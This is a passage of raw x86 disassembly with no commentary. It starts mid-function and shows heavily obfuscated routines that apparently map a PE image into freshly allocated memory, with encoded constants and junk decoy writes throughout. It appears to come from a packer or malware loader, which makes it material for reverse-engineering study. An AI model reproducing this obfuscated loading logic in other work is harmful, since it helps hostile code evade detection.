  422beb:	mov    ecx,DWORD PTR [ebp-0x14]
  422bee:	xor    eax,esi
  422bf0:	xor    ecx,esi
  422bf2:	add    eax,edi
  422bf4:	add    ecx,edi
  422bf6:	imul   eax,ecx
  422bf9:	jmp    0x422c2c
  422bfb:	mov    eax,DWORD PTR [ebp-0x4]
  422bfe:	sub    eax,edi
  422c00:	xor    eax,esi
  422c02:	mov    DWORD PTR [ebp-0x8],eax
  422c05:	lea    ebx,[ebp-0x8]
  422c08:	call   0x42294d
  422c0d:	mov    DWORD PTR [ebp-0x8],eax
  422c10:	mov    eax,DWORD PTR [ebp-0x8]
  422c13:	mov    ecx,DWORD PTR [ebp-0x4]
  422c16:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  422c1d:	mov    eax,DWORD PTR [ebp-0xc]
  422c20:	mov    ecx,DWORD PTR [ebp-0x4]
  422c23:	xor    eax,esi
  422c25:	lea    eax,[eax+ecx*1+0x3272fa]
  422c2c:	mov    DWORD PTR [ebp-0x4],eax
  422c2f:	mov    eax,DWORD PTR [ebp-0x18]
  422c32:	mov    ecx,DWORD PTR [ebp-0xc]
  422c35:	xor    ecx,esi
  422c37:	xor    eax,esi
  422c39:	sub    eax,ecx
  422c3b:	mov    ecx,DWORD PTR [ebp-0x4]
  422c3e:	cmp    ecx,eax
  422c40:	jbe    0x422bfb
  422c42:	mov    eax,DWORD PTR [ebp-0x1c]
  422c45:	xor    eax,esi
  422c47:	add    eax,edi
  422c49:	mov    DWORD PTR [ebp-0x8],eax
  422c4c:	mov    DWORD PTR [ebp-0x18],0xf89c86b6
  422c53:	mov    ebx,ebx
  422c55:	jmp    0x422cb8
  422c57:	mov    ecx,DWORD PTR [ebp-0x20]
  422c5a:	mov    eax,DWORD PTR [ebp-0x8]
  422c5d:	xor    ecx,esi
  422c5f:	add    ecx,edi
  422c61:	shr    eax,cl
  422c63:	mov    DWORD PTR [ebp-0x4],eax
  422c66:	mov    eax,DWORD PTR [ebp+0x8]
  422c69:	mov    cl,BYTE PTR [eax]
  422c6b:	mov    BYTE PTR [ebp+0xb],cl
  422c6e:	mov    cl,BYTE PTR [ebp+0xb]
  422c71:	mov    edx,DWORD PTR [ebp-0x8]
  422c74:	movzx  ecx,cl
  422c77:	xor    ecx,edx
  422c79:	mov    DWORD PTR [ebp+0x8],ecx
  422c7c:	mov    ecx,DWORD PTR [ebp-0x18]
  422c7f:	mov    edx,DWORD PTR [ebp+0x8]
  422c82:	xor    ecx,esi
  422c84:	add    ecx,edi
  422c86:	and    ecx,edx
  422c88:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  422c8f:	mov    edx,DWORD PTR [ebp-0x4]
  422c92:	xor    ecx,edx
  422c94:	mov    DWORD PTR [ebp-0x8],ecx
  422c97:	mov    ecx,DWORD PTR [ebp-0xc]
  422c9a:	xor    ecx,esi
  422c9c:	lea    eax,[eax+ecx*1+0x3272fa]
  422ca3:	mov    DWORD PTR [ebp+0x8],eax
  422ca6:	mov    eax,DWORD PTR [ebp-0xc]
  422ca9:	xor    eax,esi
  422cab:	mov    ecx,0xffcd8d06
  422cb0:	sub    ecx,eax
  422cb2:	add    ecx,DWORD PTR [ebp-0x10]
  422cb5:	mov    DWORD PTR [ebp-0x10],ecx
  422cb8:	mov    eax,DWORD PTR [ebp-0x14]
  422cbb:	mov    ecx,DWORD PTR [ebp-0x10]
  422cbe:	xor    eax,esi
  422cc0:	add    eax,edi
  422cc2:	cmp    ecx,eax
  422cc4:	jne    0x422c57
  422cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  422cc9:	mov    ecx,DWORD PTR [ebp-0x8]
  422ccc:	xor    eax,esi
  422cce:	add    eax,edi
  422cd0:	pop    edi
  422cd1:	pop    esi
  422cd2:	xor    eax,ecx
  422cd4:	pop    ebx
  422cd5:	leave  
  422cd6:	ret    0x4
  422cd9:	push   ebp
  422cda:	mov    ebp,esp
  422cdc:	mov    eax,DWORD PTR [ebp+0x1c]
  422cdf:	mov    ecx,DWORD PTR [ebp+0x8]
  422ce2:	mov    edx,DWORD PTR [ebp+0x10]
  422ce5:	mov    eax,DWORD PTR [eax+0x190]
  422ceb:	mov    eax,DWORD PTR [eax]
  422ced:	sub    esp,0x64
  422cf0:	push   ebx
  422cf1:	push   esi
  422cf2:	push   edi
  422cf3:	mov    edi,0x75108b3
  422cf8:	xor    ecx,edi
  422cfa:	mov    ebx,0x3272fa
  422cff:	add    ecx,ebx
  422d01:	cmp    ecx,edx
  422d03:	jne    0x422d14
  422d05:	or     DWORD PTR ds:0x3750c3f,0x4263ebce
  422d0f:	jmp    0x423210
  422d14:	mov    ecx,DWORD PTR [ebp+0x8]
  422d17:	mov    esi,DWORD PTR [ebp+0x14]
  422d1a:	mov    edx,DWORD PTR [esi]
  422d1c:	xor    ecx,edi
  422d1e:	add    ecx,ebx
  422d20:	cmp    edx,ecx
  422d22:	je     0x4231cb
  422d28:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d2b:	mov    DWORD PTR [ebp-0x1c],eax
  422d2e:	mov    DWORD PTR [ebp+0x1c],ecx
  422d31:	mov    ecx,DWORD PTR [ebp+0x18]
  422d34:	mov    eax,DWORD PTR [esi]
  422d36:	mov    DWORD PTR [ebp-0x20],eax
  422d39:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  422d40:	mov    edx,0xf89c85b4
  422d45:	mov    DWORD PTR [ebp-0x8],edx
  422d48:	mov    eax,DWORD PTR [ebp+0x1c]
  422d4b:	mov    DWORD PTR [ebp+0x1c],eax
  422d4e:	mov    eax,DWORD PTR [ebp+0x1c]
  422d51:	mov    eax,DWORD PTR [eax+0x190]
  422d57:	mov    eax,DWORD PTR [eax]
  422d59:	mov    DWORD PTR [ebp-0x24],ecx
  422d5c:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d5f:	mov    ecx,DWORD PTR [ecx+0x190]
  422d65:	mov    ecx,DWORD PTR [ecx]
  422d67:	add    ecx,DWORD PTR [eax+0x3c]
  422d6a:	mov    DWORD PTR [ebp+0x10],ecx
  422d6d:	mov    eax,DWORD PTR [ebp+0x8]
  422d70:	xor    eax,edi
  422d72:	add    eax,ebx
  422d74:	mov    DWORD PTR [ebp-0x4],eax
  422d77:	mov    eax,DWORD PTR [ebp+0x8]
  422d7a:	xor    eax,edi
  422d7c:	add    eax,ebx
  422d7e:	mov    DWORD PTR [ebp+0x18],eax
  422d81:	mov    eax,DWORD PTR [ebp+0x10]
  422d84:	mov    eax,DWORD PTR [eax+0x50]
  422d87:	sub    eax,0xc
  422d8a:	mov    DWORD PTR [ebp-0x28],eax
  422d8d:	mov    eax,DWORD PTR [ebp+0x10]
  422d90:	mov    eax,DWORD PTR [eax+0x38]
  422d93:	mov    ecx,DWORD PTR [ebp+0x10]
  422d96:	dec    eax
  422d97:	test   DWORD PTR [ecx+0x54],eax
  422d9a:	mov    eax,DWORD PTR [ebp+0x10]
  422d9d:	je     0x422db7
  422d9f:	mov    eax,DWORD PTR [eax+0x38]
  422da2:	mov    ecx,DWORD PTR [ebp+0x10]
  422da5:	mov    ecx,DWORD PTR [ecx+0x54]
  422da8:	dec    eax
  422da9:	not    eax
  422dab:	and    ecx,eax
  422dad:	mov    eax,DWORD PTR [ebp+0x10]
  422db0:	mov    eax,DWORD PTR [eax+0x38]
  422db3:	add    eax,ecx
  422db5:	jmp    0x422dba
  422db7:	mov    eax,DWORD PTR [eax+0x54]
  422dba:	mov    DWORD PTR [ebp+0x1c],eax
  422dbd:	mov    eax,DWORD PTR [ebp+0x8]
  422dc0:	xor    eax,edi
  422dc2:	add    eax,ebx
  422dc4:	mov    DWORD PTR [ebp+0x18],eax
  422dc7:	mov    eax,DWORD PTR [ebp+0x8]
  422dca:	xor    eax,edi
  422dcc:	add    eax,ebx
  422dce:	mov    DWORD PTR [ebp+0x18],eax
  422dd1:	mov    eax,DWORD PTR [ebp+0x8]
  422dd4:	mov    ecx,DWORD PTR [ebp-0x24]
  422dd7:	xor    eax,edi
  422dd9:	add    eax,ebx
  422ddb:	mov    DWORD PTR [ecx],eax
  422ddd:	mov    DWORD PTR [ebp+0x18],edx
  422de0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  422de7:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  422dee:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  422df5:	mov    eax,DWORD PTR [ebp-0x8]
  422df8:	mov    ecx,DWORD PTR [ebp+0x1c]
  422dfb:	xor    eax,edi
  422dfd:	add    eax,ebx
  422dff:	imul   eax,ecx
  422e02:	mov    ecx,DWORD PTR [ebp+0x8]
  422e05:	mov    edx,DWORD PTR [ebp-0x28]
  422e08:	xor    ecx,edi
  422e0a:	lea    ecx,[ecx+edx*1+0x3272fa]
  422e11:	cmp    eax,ecx
  422e13:	jae    0x4231c4
  422e19:	mov    eax,DWORD PTR [ebp+0x8]
  422e1c:	xor    eax,edi
  422e1e:	add    eax,ebx
  422e20:	mov    DWORD PTR [ebp+0x18],eax
  422e23:	mov    eax,DWORD PTR [ebp+0x1c]
  422e26:	add    eax,DWORD PTR [ebp-0x1c]
  422e29:	mov    DWORD PTR [ebp-0x4],eax
  422e2c:	push   DWORD PTR [ebp-0x4]
  422e2f:	mov    esi,DWORD PTR [ebp-0x1c]
  422e32:	mov    ecx,DWORD PTR [ebp+0x10]
  422e35:	call   0x421f85
  422e3a:	mov    DWORD PTR [ebp+0xc],eax
  422e3d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  422e44:	mov    eax,DWORD PTR [ebp-0x18]
  422e47:	xor    eax,edi
  422e49:	lea    ecx,[ebp-0x40]
  422e4c:	add    eax,ebx
  422e4e:	push   ecx
  422e4f:	call   0x422519
  422e54:	mov    eax,DWORD PTR [ebp+0xc]
  422e57:	test   eax,eax
  422e59:	je     0x422ea9
  422e5b:	mov    eax,DWORD PTR [ebp-0x18]
  422e5e:	xor    eax,edi
  422e60:	add    eax,ebx
  422e62:	push   eax
  422e63:	push   DWORD PTR [ebp+0xc]
  422e66:	lea    eax,[ebp-0x40]
  422e69:	push   eax
  422e6a:	call   0x42240f
  422e6f:	mov    eax,DWORD PTR [ebp-0x4]
  422e72:	mov    DWORD PTR [ebp-0x18],eax
  422e75:	mov    eax,DWORD PTR [ebp-0x18]
  422e78:	mov    ecx,DWORD PTR [ebp-0x1c]
  422e7b:	sub    eax,ecx
  422e7d:	mov    DWORD PTR [ebp-0x18],eax
  422e80:	mov    eax,DWORD PTR [ebp+0xc]
  422e83:	mov    ecx,DWORD PTR [ebp+0xc]
  422e86:	mov    eax,DWORD PTR [eax+0x10]
  422e89:	add    eax,DWORD PTR [ecx+0xc]
  422e8c:	mov    ecx,DWORD PTR [ebp-0x18]
  422e8f:	cmp    ecx,eax
  422e91:	jb     0x422ea9
  422e93:	mov    eax,DWORD PTR [ebp+0xc]
  422e96:	mov    eax,DWORD PTR [eax+0xc]
  422e99:	mov    ecx,DWORD PTR [ebp+0xc]
  422e9c:	add    eax,DWORD PTR [ecx+0x8]
  422e9f:	mov    ecx,DWORD PTR [ebp-0x18]
  422ea2:	sub    eax,ecx
  422ea4:	jmp    0x423197
  422ea9:	push   0xc
  422eab:	push   DWORD PTR [ebp-0x4]
  422eae:	lea    eax,[ebp-0x4c]
  422eb1:	push   eax
  422eb2:	call   0x42240f
  422eb7:	mov    eax,0xf89c85b5
  422ebc:	mov    DWORD PTR [ebp-0x2c],eax
  422ebf:	mov    DWORD PTR [ebp-0x30],0xf89c85b4
  422ec6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  422ecd:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  422ed4:	lea    ecx,[ebp-0x2c]
  422ed7:	mov    DWORD PTR [ebp-0xc],ecx
  422eda:	lea    ecx,[ebp-0x30]
  422edd:	mov    DWORD PTR [ebp-0x10],ecx
  422ee0:	lea    ecx,[ebp-0x34]
  422ee3:	mov    DWORD PTR [ebp+0xc],ecx
  422ee6:	lea    ecx,[ebp-0x38]
  422ee9:	mov    DWORD PTR [ebp-0x14],ecx
  422eec:	mov    ecx,DWORD PTR [ebp+0x8]
  422eef:	xor    ecx,edi
  422ef1:	add    ecx,ebx
  422ef3:	mov    DWORD PTR [ebp-0x18],ecx
  422ef6:	jmp    0x4230f2
  422efb:	cmp    eax,0xf89c85bb
  422f00:	je     0x423104
  422f06:	mov    ecx,DWORD PTR [ebp-0x8]
  422f09:	xor    ecx,edi
  422f0b:	mov    esi,eax
  422f0d:	add    ecx,ebx
  422f0f:	mov    DWORD PTR [ebp+0x18],ecx
  422f12:	mov    eax,DWORD PTR [ebp-0x18]
  422f15:	xor    esi,edi
  422f17:	lea    eax,[eax+esi*1+0x3272fa]
  422f1e:	mov    DWORD PTR [ebp-0x18],eax
  422f21:	mov    eax,DWORD PTR [ebp-0x8]
  422f24:	mov    ecx,DWORD PTR [ebp-0x18]
  422f27:	xor    eax,edi
  422f29:	add    eax,ebx
  422f2b:	cmp    ecx,eax
  422f2d:	jne    0x422f42
  422f2f:	mov    eax,DWORD PTR [ebp+0x8]
  422f32:	xor    eax,edi
  422f34:	add    eax,ebx
  422f36:	push   eax
  422f37:	push   0xc
  422f39:	lea    eax,[ebp-0x4c]
  422f3c:	push   eax
  422f3d:	call   0x4229f5
  422f42:	mov    eax,DWORD PTR [ebp-0xc]
  422f45:	mov    eax,DWORD PTR [eax]
  422f47:	xor    eax,edi
  422f49:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f50:	mov    ecx,DWORD PTR [ebp+0x8]
  422f53:	xor    ecx,edi
  422f55:	movzx  eax,al
  422f58:	add    ecx,ebx
  422f5a:	cmp    eax,ecx
  422f5c:	je     0x4230da
  422f62:	mov    eax,DWORD PTR [ebp-0x10]
  422f65:	mov    eax,DWORD PTR [eax]
  422f67:	xor    eax,edi
  422f69:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f70:	mov    ecx,DWORD PTR [ebp+0x8]
  422f73:	xor    ecx,edi
  422f75:	movzx  eax,al
  422f78:	add    ecx,ebx
  422f7a:	cmp    eax,ecx
  422f7c:	je     0x4230da
  422f82:	mov    eax,DWORD PTR [ebp+0xc]
  422f85:	mov    eax,DWORD PTR [eax]
  422f87:	xor    eax,edi
  422f89:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f90:	mov    ecx,DWORD PTR [ebp+0x8]
  422f93:	xor    ecx,edi
  422f95:	movzx  eax,al
  422f98:	add    ecx,ebx
  422f9a:	cmp    eax,ecx
  422f9c:	je     0x4230da
  422fa2:	mov    eax,DWORD PTR [ebp-0x14]
  422fa5:	mov    eax,DWORD PTR [eax]
  422fa7:	xor    eax,edi
  422fa9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fb0:	mov    ecx,DWORD PTR [ebp+0x8]
  422fb3:	xor    ecx,edi
  422fb5:	movzx  eax,al
  422fb8:	add    ecx,ebx
  422fba:	cmp    eax,ecx
  422fbc:	je     0x4230da
  422fc2:	mov    eax,DWORD PTR [ebp-0x10]
  422fc5:	mov    eax,DWORD PTR [eax]
  422fc7:	xor    eax,edi
  422fc9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fd0:	mov    ecx,DWORD PTR [ebp-0xc]
  422fd3:	mov    ecx,DWORD PTR [ecx]
  422fd5:	xor    ecx,edi
  422fd7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fde:	xor    al,cl
  422fe0:	mov    ecx,DWORD PTR [ebp+0xc]
  422fe3:	mov    ecx,DWORD PTR [ecx]
  422fe5:	xor    ecx,edi
  422fe7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fee:	or     al,cl
  422ff0:	mov    ecx,DWORD PTR [ebp-0xc]
  422ff3:	mov    ecx,DWORD PTR [ecx]
  422ff5:	xor    ecx,edi
  422ff7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  422ffe:	cmp    cl,al
  423000:	jne    0x4230da
  423006:	mov    eax,DWORD PTR [ebp+0xc]
  423009:	mov    eax,DWORD PTR [eax]
  42300b:	xor    eax,edi
  42300d:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423014:	mov    ecx,DWORD PTR [ebp-0x10]
  423017:	mov    ecx,DWORD PTR [ecx]
  423019:	xor    ecx,edi
  42301b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423022:	xor    al,cl
  423024:	mov    ecx,DWORD PTR [ebp-0x14]
  423027:	mov    ecx,DWORD PTR [ecx]
  423029:	xor    ecx,edi
  42302b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423032:	or     al,cl
  423034:	mov    ecx,DWORD PTR [ebp-0x10]
  423037:	mov    ecx,DWORD PTR [ecx]
  423039:	xor    ecx,edi
  42303b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423042:	cmp    cl,al
  423044:	jne    0x4230da
  42304a:	mov    eax,DWORD PTR [ebp-0x14]
  42304d:	mov    eax,DWORD PTR [eax]
  42304f:	xor    eax,edi
  423051:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423058:	mov    ecx,DWORD PTR [ebp+0xc]
  42305b:	mov    ecx,DWORD PTR [ecx]
  42305d:	xor    ecx,edi
  42305f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423066:	xor    al,cl
  423068:	mov    ecx,DWORD PTR [ebp-0xc]
  42306b:	mov    ecx,DWORD PTR [ecx]
  42306d:	xor    ecx,edi
  42306f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423076:	or     al,cl
  423078:	mov    ecx,DWORD PTR [ebp+0xc]
  42307b:	mov    ecx,DWORD PTR [ecx]
  42307d:	xor    ecx,edi
  42307f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423086:	cmp    cl,al
  423088:	jne    0x4230da
  42308a:	mov    eax,DWORD PTR [ebp-0x14]
  42308d:	mov    eax,DWORD PTR [eax]
  42308f:	xor    eax,edi
  423091:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423098:	mov    ecx,DWORD PTR [ebp-0xc]
  42309b:	mov    ecx,DWORD PTR [ecx]
  42309d:	xor    ecx,edi
  42309f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230a6:	xor    al,cl
  4230a8:	mov    ecx,DWORD PTR [ebp-0x10]
  4230ab:	mov    ecx,DWORD PTR [ecx]
  4230ad:	xor    ecx,edi
  4230af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230b6:	or     al,cl
  4230b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4230bb:	mov    ecx,DWORD PTR [ecx]
  4230bd:	xor    ecx,edi
  4230bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  4230c6:	cmp    cl,al
  4230c8:	jne    0x4230da
  4230ca:	lea    eax,[ebp-0x4c]
  4230cd:	push   eax
  4230ce:	call   0x422b95
  4230d3:	mov    ecx,DWORD PTR [ebp-0x44]
  4230d6:	cmp    eax,ecx
  4230d8:	je     0x4230e4
  4230da:	mov    eax,DWORD PTR [ebp+0x8]
  4230dd:	xor    eax,edi
  4230df:	add    eax,ebx
  4230e1:	mov    DWORD PTR [ebp+0x18],eax
  4230e4:	mov    eax,DWORD PTR [ebp-0x8]
  4230e7:	xor    eax,edi
  4230e9:	lea    eax,[eax+esi*1+0x3272fa]
  4230f0:	xor    eax,edi
  4230f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4230f5:	mov    edx,DWORD PTR [ebp+0x18]
  4230f8:	xor    ecx,edi
  4230fa:	add    ecx,ebx
  4230fc:	cmp    edx,ecx
  4230fe:	je     0x422efb
  423104:	mov    eax,DWORD PTR [ebp+0x8]
  423107:	mov    ecx,DWORD PTR [ebp+0x18]
  42310a:	xor    eax,edi
  42310c:	add    eax,ebx
  42310e:	cmp    ecx,eax
  423110:	jne    0x423123
  423112:	mov    eax,DWORD PTR [ebp-0x8]
  423115:	mov    ecx,DWORD PTR [ebp+0x1c]
  423118:	xor    eax,edi
  42311a:	lea    eax,[eax+ecx*1+0x3272fa]
  423121:	jmp    0x42319a
  423123:	push   0x18
  423125:	push   DWORD PTR [ebp-0x4]
  423128:	lea    eax,[ebp-0x64]
  42312b:	push   eax
  42312c:	call   0x42240f
  423131:	mov    eax,DWORD PTR [ebp+0x8]
  423134:	mov    ecx,DWORD PTR [ebp-0x18]
  423137:	xor    eax,edi
  423139:	add    eax,ebx
  42313b:	cmp    eax,ecx
  42313d:	je     0x423152
  42313f:	mov    eax,DWORD PTR [ebp+0x8]
  423142:	xor    eax,edi
  423144:	add    eax,ebx
  423146:	push   eax
  423147:	push   0x18
  423149:	lea    eax,[ebp-0x64]
  42314c:	push   eax
  42314d:	call   0x4229f5
  423152:	mov    eax,DWORD PTR [ebp-0x4]
  423155:	add    eax,0x18
  423158:	mov    DWORD PTR [ebp+0x18],eax
  42315b:	push   DWORD PTR [ebp-0x50]
  42315e:	push   DWORD PTR [ebp+0x18]
  423161:	mov    eax,DWORD PTR [ebp-0x54]
  423164:	add    eax,DWORD PTR [ebp-0x20]
  423167:	push   eax
  423168:	call   0x42240f
  42316d:	mov    eax,DWORD PTR [ebp+0x8]
  423170:	mov    ecx,DWORD PTR [ebp-0x18]
  423173:	xor    eax,edi
  423175:	add    eax,ebx
  423177:	cmp    eax,ecx
  423179:	je     0x42318c
  42317b:	push   0x0
  42317d:	push   DWORD PTR [ebp-0x50]
  423180:	mov    eax,DWORD PTR [ebp-0x54]
  423183:	add    eax,DWORD PTR [ebp-0x20]
  423186:	push   eax
  423187:	call   0x4229f5
  42318c:	mov    eax,DWORD PTR [ebp-0x24]
  42318f:	mov    ecx,DWORD PTR [ebp-0x50]
  423192:	add    DWORD PTR [eax],ecx
  423194:	mov    eax,DWORD PTR [ebp-0x50]
  423197:	add    eax,DWORD PTR [ebp+0x1c]
  42319a:	mov    DWORD PTR [ebp+0x1c],eax
  42319d:	mov    eax,DWORD PTR [ebp-0x8]
  4231a0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4231a3:	xor    eax,edi
  4231a5:	add    eax,ebx
  4231a7:	imul   eax,ecx
  4231aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ad:	mov    edx,DWORD PTR [ebp-0x28]
  4231b0:	xor    ecx,edi
  4231b2:	lea    ecx,[ecx+edx*1+0x3272fa]
  4231b9:	cmp    eax,ecx
  4231bb:	jb     0x422e19
  4231c1:	mov    esi,DWORD PTR [ebp+0x14]
  4231c4:	mov    eax,DWORD PTR [ebp-0x20]
  4231c7:	mov    DWORD PTR [esi],eax
  4231c9:	jmp    0x423210
  4231cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ce:	mov    edx,DWORD PTR [ebp+0xc]
  4231d1:	xor    ecx,edi
  4231d3:	xor    edx,edi
  4231d5:	add    ecx,ebx
  4231d7:	add    edx,ebx
  4231d9:	cmp    ecx,edx
  4231db:	jne    0x4231ef
  4231dd:	mov    eax,ds:0x7f642dde
  4231e2:	imul   eax,eax,0x9f15fcef
  4231e8:	mov    ds:0x7f642dde,eax
  4231ed:	jmp    0x423210
  4231ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4231f2:	xor    ecx,edi
  4231f4:	add    ecx,ebx
  4231f6:	cmp    eax,ecx
  4231f8:	je     0x423206
  4231fa:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  423204:	jmp    0x423210
  423206:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  423210:	pop    edi
  423211:	pop    esi
  423212:	pop    ebx
  423213:	leave  
  423214:	ret    0x18
  423217:	push   ebp
  423218:	mov    ebp,esp
  42321a:	and    esp,0xfffffff8
  42321d:	mov    eax,DWORD PTR [ebp+0x20]
  423220:	sub    esp,0x14
  423223:	push   ebx
  423224:	mov    ebx,DWORD PTR [ebp+0x14]
  423227:	push   esi
  423228:	push   edi
  423229:	cmp    eax,0xf89c85b5
  42322e:	jne    0x42323a
  423230:	push   0xf89c85b4
  423235:	jmp    0x42336c
  42323a:	mov    eax,DWORD PTR [ebp+0x20]
  42323d:	cmp    eax,0xf89c85b4
  423242:	jne    0x42324e
  423244:	push   0xf89c85bb
  423249:	jmp    0x42336c
  42324e:	mov    eax,DWORD PTR [ebp+0x20]
  423251:	cmp    eax,0xf89c85bb
  423256:	jne    0x423262
  423258:	push   0xf89c85ba
  42325d:	jmp    0x42336c
  423262:	mov    eax,DWORD PTR [ebp+0x20]
  423265:	cmp    eax,0xf89c85ba
  42326a:	jne    0x423276
  42326c:	push   0xf89c85b9
  423271:	jmp    0x42336c
  423276:	mov    ecx,DWORD PTR [ebp+0x20]
  423279:	mov    eax,0xf89c85be
  42327e:	cmp    ecx,eax
  423280:	jne    0x42333c
  423286:	mov    eax,DWORD PTR [ebp+0x10]
  423289:	mov    DWORD PTR [esp+0xc],eax
  42328d:	mov    eax,DWORD PTR [ebp+0x18]
  423290:	mov    DWORD PTR [esp+0x14],eax
  423294:	mov    eax,DWORD PTR [ebp+0xc]
  423297:	mov    DWORD PTR [esp+0x18],eax
  42329b:	mov    eax,DWORD PTR [ebp+0x8]
  42329e:	mov    DWORD PTR [esp+0x10],eax
  4232a2:	mov    eax,DWORD PTR [esp+0x10]
  4232a6:	mov    ecx,DWORD PTR [esp+0x14]
  4232aa:	mov    edi,0x75108b3
  4232af:	xor    eax,edi
  4232b1:	mov    esi,0x3272fa
  4232b6:	add    eax,esi
  4232b8:	mov    DWORD PTR [ecx],eax
  4232ba:	mov    eax,DWORD PTR [esp+0xc]
  4232be:	mov    eax,DWORD PTR [eax+0x194]
  4232c4:	mov    ecx,DWORD PTR [eax]
  4232c6:	mov    eax,DWORD PTR [esp+0xc]
  4232ca:	mov    eax,DWORD PTR [eax+0x194]
  4232d0:	mov    eax,DWORD PTR [eax]
  4232d2:	add    eax,DWORD PTR [ecx+0x3c]
  4232d5:	mov    ecx,DWORD PTR [esp+0xc]
  4232d9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4232df:	mov    ecx,DWORD PTR [ecx+0x14]
  4232e2:	push   0x4
  4232e4:	push   0x3000
  4232e9:	push   DWORD PTR [eax+0x50]
  4232ec:	push   0x0
  4232ee:	call   ecx
  4232f0:	mov    DWORD PTR [ebx],eax
  4232f2:	mov    eax,DWORD PTR [esp+0x10]
  4232f6:	push   DWORD PTR [esp+0xc]
  4232fa:	xor    eax,edi
  4232fc:	add    eax,esi
  4232fe:	mov    DWORD PTR [esp+0x20],eax
  423302:	lea    eax,[esp+0x20]
  423306:	push   eax
  423307:	push   ebx
  423308:	push   DWORD PTR [esp+0x20]
  42330c:	push   DWORD PTR [esp+0x28]
  423310:	push   DWORD PTR [esp+0x24]
  423314:	call   0x422cd9
  423319:	mov    eax,DWORD PTR [esp+0x10]
  42331d:	mov    ecx,DWORD PTR [ebx]
  42331f:	xor    eax,edi
  423321:	add    eax,esi
  423323:	cmp    ecx,eax
  423325:	je     0x423383
  423327:	mov    eax,DWORD PTR [esp+0x18]
  42332b:	mov    ecx,DWORD PTR [esp+0x14]
  42332f:	xor    eax,edi
  423331:	add    eax,esi
  423333:	imul   eax,DWORD PTR [esp+0x1c]
  423338:	mov    DWORD PTR [ecx],eax
  42333a:	jmp    0x423383
  42333c:	mov    ecx,DWORD PTR [ebp+0x20]
  42333f:	cmp    ecx,0xf89c85b9
  423345:	jne    0x42334e
  423347:	push   0xf89c85b8
  42334c:	jmp    0x42336c
  42334e:	mov    ecx,DWORD PTR [ebp+0x20]
  423351:	cmp    ecx,0xf89c85b8
  423357:	jne    0x423360
  423359:	push   0xf89c85bf
  42335e:	jmp    0x42336c
  423360:	mov    ecx,DWORD PTR [ebp+0x20]
  423363:	cmp    ecx,0xf89c85bf
  423369:	jne    0x423383
  42336b:	push   eax
  42336c:	push   DWORD PTR [ebp+0x1c]
  42336f:	push   DWORD PTR [ebp+0x18]
  423372:	push   ebx
  423373:	push   DWORD PTR [ebp+0x10]
  423376:	push   DWORD PTR [ebp+0xc]
  423379:	push   DWORD PTR [ebp+0x8]
  42337c:	call   0x423217
  423381:	mov    DWORD PTR [ebx],eax
  423383:	mov    eax,DWORD PTR [ebx]
  423385:	pop    edi
  423386:	pop    esi
  423387:	pop    ebx
  423388:	mov    esp,ebp
  42338a:	pop    ebp
  42338b:	ret    0x1c
  42338e:	push   ebp
  42338f:	mov    ebp,esp
  423391:	sub    esp,0xc
  423394:	mov    eax,0xf89c85b5
  423399:	mov    DWORD PTR [ebp-0x8],eax
  42339c:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4233a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4233a6:	xor    ecx,0x75108b3
  4233ac:	add    ecx,0x3272fa
  4233b2:	mov    DWORD PTR [ebp-0x4],ecx
  4233b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4233b8:	push   eax
  4233b9:	mov    DWORD PTR [ebp+0xc],ecx
  4233bc:	push   DWORD PTR [ebp+0xc]
  4233bf:	lea    eax,[ebp-0x4]
  4233c2:	push   DWORD PTR [ebp+0x8]
  4233c5:	push   eax
  4233c6:	push   DWORD PTR [ebp+0xc]
  4233c9:	push   DWORD PTR [ebp-0xc]
  4233cc:	push   DWORD PTR [ebp-0x8]
  4233cf:	call   0x423217
  4233d4:	mov    DWORD PTR [ebp-0x4],eax
  4233d7:	mov    eax,DWORD PTR [ebp-0x4]
  4233da:	leave  
  4233db:	ret    0x8
	...
